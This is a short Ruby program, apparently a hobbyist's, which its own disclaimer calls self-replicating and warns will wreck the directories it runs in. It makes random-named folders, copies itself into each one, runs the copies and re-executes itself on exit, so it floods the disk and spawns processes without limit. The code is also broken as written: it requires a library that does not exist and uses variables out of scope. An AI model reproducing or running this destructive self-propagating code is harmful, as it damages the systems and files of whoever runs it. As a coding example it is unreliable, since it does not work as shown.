=begin
<DISCLAIMER>
THIS CODE REPLICATES ITSELF AND WILL CREATE NEW DIRECTORIES
PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDERS
***DO NOT RUN THIS FILE IN ANY IMPORTANT DIRECTORIES***

self-replicating ruby file - Replicada by archisha69
=end

require "fileutils"
require "securerandom"
require "dir"
require "thread"

def subrun()
    system("ruby #{File.basename(__FILE__)}")
end

def cp(dest)
    FileUtils.cp("#{cwd}/#{File.basename(__FILE__)}", dest)
end

def crossdir()
    while count < 8 do #layers
        subrun()
        for qwerty in Dir.entries(name) do
            cp(qwerty)
            FileUtils.cd(qwerty)
            subrun()
        end
    end
end

at_exit do
    exec("ruby #{File.basename(__FILE__)}")
end

cwd = FileUtils.pwd()

count = 0

while count < 100
#while true
    name = SecureRandom.hex
    FileUtils.mkdir(name)
    FileUtils.cd(name)
    FileUtils.cp("../#{File.basename(__FILE__)}", FileUtils.pwd())
    t = Thread.new {
        crossdir()
    }
    t.join
    FileUtils.cd(cwd)
    count += 1
end
